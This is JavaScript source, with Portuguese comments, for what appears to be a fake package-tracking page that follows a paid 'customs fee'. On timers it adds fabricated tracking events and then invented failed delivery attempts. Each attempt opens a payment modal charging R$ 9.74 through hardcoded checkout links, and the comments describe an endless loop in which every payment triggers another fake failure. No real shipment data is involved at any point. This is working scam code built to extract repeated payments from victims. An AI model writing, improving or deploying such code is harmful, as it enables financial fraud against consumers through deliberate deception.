/**
 * Sistema de fluxo pós-pagamento da taxa alfandegária
 * VERSÃO LIMPA - SEM SIMULADORES DE TESTE
 */
export class PostPaymentSystem {
    constructor(trackingSystem) {
        this.trackingSystem = trackingSystem;
        this.deliveryAttempts = 0; // Contador de tentativas (0, 1, 2 para 1ª, 2ª, 3ª)
        this.deliveryValues = [9.74, 9.74, 9.74]; // Valor fixo R$ 9,74 para todas as tentativas
        this.deliveryLinks = [
            'https://checkout.zentrapaybr.com/xPTSsVmH', // 1ª tentativa
            'https://checkout.zentrapaybr.com/xkgmEGMN', // 2ª tentativa
            'https://checkout.zentrapaybr.com/jnHNAKcF'  // 3ª tentativa
        ];
        this.isProcessing = false;
        this.timers = [];
        this.currentStep = 0;
        this.totalDeliveryAttempts = 0; // Contador total de tentativas (para loop infinito)
        
        console.log('🚀 Sistema de fluxo pós-pagamento inicializado');
        console.log('💰 Valor fixo para todas as tentativas: R$ 9,74');
        console.log('🔗 Links de checkout configurados:', this.deliveryLinks);
    }

    // Iniciar fluxo pós-pagamento após liberação alfandegária
    startPostPaymentFlow() {
        console.log('🚀 Iniciando fluxo pós-pagamento...');

        // Etapa 1: Liberado na alfândega
        this.addTimelineStep({
            stepNumber: 1,
            title: 'Pedido liberado na alfândega de importação',
            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
            delay: 0,
            nextStepDelay: 2 * 60 * 60 * 1000 // 2 horas para próxima etapa
        });
        
        // Etapa 2: Pedido sairá para entrega (após 2 horas)
        this.addTimelineStep({
            stepNumber: 2,
            title: 'Pedido sairá para entrega',
            description: 'Pedido sairá para entrega para seu endereço',
            delay: 2 * 60 * 60 * 1000, // 2 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 3: Pedido em trânsito (após 2.5 horas)
        this.addTimelineStep({
            stepNumber: 3,
            title: 'Pedido em trânsito',
            description: 'Pedido em trânsito para seu endereço',
            delay: 2 * 60 * 60 * 1000 + 30 * 60 * 1000, // 2.5 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 4: Pedido em rota de entrega (após 3 horas)
        this.addTimelineStep({
            stepNumber: 4,
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 3 * 60 * 60 * 1000, // 3 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 5: Tentativa de entrega (após 3.5 horas)
        this.addTimelineStep({
            stepNumber: 5,
            title: '1ª Tentativa de entrega',
            description: '1ª tentativa de entrega realizada, mas não foi possível entregar',
            delay: 3 * 60 * 60 * 1000 + 30 * 60 * 1000, // 3.5 horas
            isDeliveryAttempt: true,
            attemptNumber: 1,
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
    }
    

    // Adicionar nova etapa na timeline
    addTimelineStep({ stepNumber, title, description, delay, nextStepDelay, isDeliveryAttempt = false, attemptNumber = 0 }) {
        const timer = setTimeout(() => {
            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
            
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;

            const stepDate = new Date();
            const timelineItem = this.createTimelineItem({
                stepNumber,
                title,
                description,
                date: stepDate,
                completed: true,
                isDeliveryAttempt,
                attemptNumber,
                nextStepDelay
            });

            timeline.appendChild(timelineItem);

            // Animar entrada da nova etapa
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, 100);

            // Scroll para a nova etapa
            timelineItem.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });

            this.currentStep = stepNumber;

        }, delay);

        this.timers.push(timer);
    }

    // Criar item da timeline
    createTimelineItem({ stepNumber, title, description, date, completed, isDeliveryAttempt, attemptNumber = 0 }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        if (isDeliveryAttempt) {
            // Botão "Liberar Entrega" com visual igual ao "Liberar Objeto"
            buttonHtml = `
                <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${attemptNumber - 1}" data-attempt-display="${attemptNumber}">
                    <i class="fas fa-truck"></i> Liberar Entrega
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        if (isDeliveryAttempt) {
            const retryButton = item.querySelector('.delivery-retry-btn');
            if (retryButton) {
                this.configureDeliveryRetryButton(retryButton, attemptNumber);
            }
        }

        return item;
    }

    // Configurar botão de reenvio com visual igual ao "Liberar Objeto"
    configureDeliveryRetryButton(button, attemptNumber) {
        // Aplicar o mesmo estilo do botão "Liberar Objeto"
        button.style.cssText = `
            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
            animation: pulse 2s infinite;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
            margin-top: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        `;

        button.addEventListener('click', () => {
            this.handleDeliveryRetry(button, attemptNumber);
        });

        console.log(`🔄 Botão "Liberar Entrega" configurado para tentativa ${attemptNumber}`);
    }

    // Lidar com reenvio - GERAR PIX FUNCIONAL
    async handleDeliveryRetry(button, attemptNumber) {
        if (this.isProcessing) return;

        this.isProcessing = true;
        const currentAttempt = attemptNumber || parseInt(button.dataset.attemptDisplay) || 1;
        const value = 9.74; // Valor fixo para todas as tentativas
        const checkoutLink = this.deliveryLinks[(currentAttempt - 1) % this.deliveryLinks.length];
        
        console.log(`🔄 Processando reenvio - ${currentAttempt}ª tentativa - R$ ${value.toFixed(2)}`);
        console.log(`🔗 Link de checkout: ${checkoutLink}`);

        // Mostrar modal de pagamento diretamente
        this.showDeliveryPaymentModal(value, currentAttempt, checkoutLink);
    }

    // Mostrar modal de pagamento para tentativa de entrega
    showDeliveryPaymentModal(value, attemptNumber, checkoutLink) {
        // Atualizar modal existente com dados da tentativa atual
        const modal = document.getElementById('deliveryModal');
        if (!modal) return;
        
        // Atualizar título do modal
        const modalTitle = document.getElementById('deliveryModalTitle');
        if (modalTitle) {
            modalTitle.textContent = `${attemptNumber}ª Tentativa de Entrega`;
        }
        
        // Atualizar texto da tentativa
        const attemptText = document.getElementById('deliveryAttemptText');
        if (attemptText) {
            const currentTime = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            attemptText.innerHTML = `${attemptNumber}ª tentativa de entrega realizada às <strong>${currentTime}</strong>, mas não foi possível entregar.`;
        }
        
        // Atualizar valor da taxa
        const feeValue = document.getElementById('deliveryFeeValue');
        if (feeValue) {
            feeValue.textContent = `R$ ${value.toFixed(2)}`;
        }
        
        // Mostrar modal
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        console.log(`💳 Modal de pagamento exibido - ${attemptNumber}ª tentativa - R$ ${value.toFixed(2)}`);
        console.log(`🔗 Checkout link: ${checkoutLink}`);
    }

    // Processar reenvio após pagamento
    processDeliveryRetry(attemptNumber) {
        console.log(`✅ Processando ${attemptNumber}ª tentativa de entrega`);
        
        // Ocultar botão "Liberar Entrega" atual
        this.hideCurrentDeliveryButton(attemptNumber);

        // Incrementar contadores
        this.totalDeliveryAttempts++;
        this.deliveryAttempts = (attemptNumber % 3); // Ciclo 0, 1, 2 (1ª, 2ª, 3ª)
        
        console.log(`🔄 Total de tentativas: ${this.totalDeliveryAttempts}`);
        console.log(`🔄 Próxima tentativa será: ${this.deliveryAttempts + 1}ª`);

        // Iniciar novo ciclo de entrega após 2 segundos
        setTimeout(() => {
            this.startNewDeliveryCycle();
        }, 2000);
    }
    
    // Ocultar botão "Liberar Entrega" atual
    hideCurrentDeliveryButton(attemptNumber) {
        const currentButton = document.querySelector(`[data-attempt-display="${attemptNumber}"]`);
        if (currentButton) {
            currentButton.style.display = 'none';
            console.log(`🔒 Botão "Liberar Entrega" da ${attemptNumber}ª tentativa ocultado`);
        }
    }

    // Iniciar novo ciclo de entrega (loop infinito)
    startNewDeliveryCycle() {
        console.log('🚚 Iniciando novo ciclo de entrega...');

        this.isProcessing = false;
        
        // Determinar qual tentativa será (1ª, 2ª ou 3ª no ciclo)
        const nextAttemptInCycle = (this.deliveryAttempts % 3) + 1;
        const baseStep = 1000 + (this.totalDeliveryAttempts * 10); // IDs únicos para cada ciclo

        console.log(`📦 Iniciando ${nextAttemptInCycle}ª tentativa do ciclo ${Math.ceil(this.totalDeliveryAttempts / 3)}`);

        // Etapa 1: Sairá para entrega (imediato)
        this.addTimelineStep({
            stepNumber: baseStep + 1,
            title: 'Pedido sairá para entrega',
            description: 'Pedido sairá para entrega para seu endereço',
            delay: 0,
            nextStepDelay: 2000 // 2 segundos
        });
        
        // Etapa 2: Em trânsito (após 2 segundos)
        this.addTimelineStep({
            stepNumber: baseStep + 2,
            title: 'Pedido em trânsito',
            description: 'Pedido em trânsito para seu endereço',
            delay: 2000, // 2 segundos
            nextStepDelay: 2 * 60 * 60 * 1000 // 2 horas
        });
        
        // Etapa 3: Em rota de entrega (após 2 horas)
        this.addTimelineStep({
            stepNumber: baseStep + 3,
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 2 * 60 * 60 * 1000 + 2000, // 2 horas + 2 segundos
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 4: Nova tentativa de entrega (após 2.5 horas)
        this.addTimelineStep({
            stepNumber: baseStep + 4,
            title: `${nextAttemptInCycle}ª Tentativa de entrega`,
            description: `${nextAttemptInCycle}ª tentativa de entrega realizada, mas não foi possível entregar`,
            delay: 2 * 60 * 60 * 1000 + 30 * 60 * 1000 + 2000, // 2.5 horas + 2 segundos
            isDeliveryAttempt: true,
            attemptNumber: nextAttemptInCycle,
            nextStepDelay: 0
        });
    }

    // Verificar se é horário útil (8h às 18h, segunda a sexta)
    isBusinessHour(date) {
        const hour = date.getHours();
        const day = date.getDay(); // 0 = domingo, 6 = sábado
        
        return day >= 1 && day <= 5 && hour >= 8 && hour < 18;
    }

    // Obter próximo horário útil
    getNextBusinessTime(date) {
        const next = new Date(date);
        
        // Se for fim de semana, ir para segunda-feira
        if (next.getDay() === 0) { // Domingo
            next.setDate(next.getDate() + 1);
        } else if (next.getDay() === 6) { // Sábado
            next.setDate(next.getDate() + 2);
        }
        
        // Se for após 18h, ir para próximo dia útil às 8h
        if (next.getHours() >= 18) {
            next.setDate(next.getDate() + 1);
            next.setHours(8, 0, 0, 0);
        } else if (next.getHours() < 8) {
            next.setHours(8, 0, 0, 0);
        }
        
        return next;
    }

    // Limpar todos os timers
    clearAllTimers() {
        this.timers.forEach(timer => clearTimeout(timer));
        this.timers = [];
        console.log('🧹 Todos os timers foram limpos');
    }

    // Resetar sistema
    reset() {
        this.clearAllTimers();
        this.deliveryAttempts = 0;
        this.totalDeliveryAttempts = 0;
        this.isProcessing = false;
        this.currentStep = 0;
        
        // Fechar modal se aberto
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        console.log('🔄 Sistema resetado');
    }

    // Obter status atual do sistema
    getStatus() {
        return {
            deliveryAttempts: this.deliveryAttempts,
            totalDeliveryAttempts: this.totalDeliveryAttempts,
            isProcessing: this.isProcessing,
            currentStep: this.currentStep,
            activeTimers: this.timers.length,
            currentDeliveryValue: 9.74,
            nextAttemptNumber: (this.deliveryAttempts % 3) + 1,
            currentCycle: Math.ceil(this.totalDeliveryAttempts / 3)
        };
    }
}